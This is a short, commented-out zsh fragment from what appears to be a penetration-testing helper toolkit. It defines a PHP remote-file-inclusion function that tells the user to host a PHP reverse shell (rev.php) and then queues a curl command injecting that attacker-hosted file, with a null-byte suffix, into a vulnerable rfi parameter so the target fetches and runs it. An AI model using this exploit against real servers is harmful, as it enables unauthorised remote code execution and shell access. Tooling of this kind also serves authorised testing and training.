# #!/usr/bin/env zsh

# ############################################################# 
# # qq-enum-web-php
# #############################################################

# qq-enum-web-php-rfi-() {
#     __warn "URL must include an rfi param like /page.php?rfi="
#     __warn "Serve php reverse shell in rev.php first..."
    
#     print -z "curl -XGET \"${u}=http://${l}/rev.php%00\" "
# }